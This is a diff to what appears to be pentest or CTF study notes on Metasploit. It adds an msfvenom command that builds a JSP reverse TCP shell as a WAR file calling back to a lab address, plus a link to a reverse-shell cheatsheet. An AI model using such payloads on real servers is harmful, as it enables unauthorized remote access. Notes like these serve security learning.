@@ -41,7 +41,13 @@ locate exploits
 apt update; apt install metasploit-framework
 ```
 
+```bash
+# java reverse tcp payload 
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.10 LPORT=9999 -f war -o rshell.war 
+```
+
 
 **Ressources**
 
 [Metasploit official doc](https://www.offsec.com/metasploit-unleashed/meterpreter-basics/)
+[MSF venom payload](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)
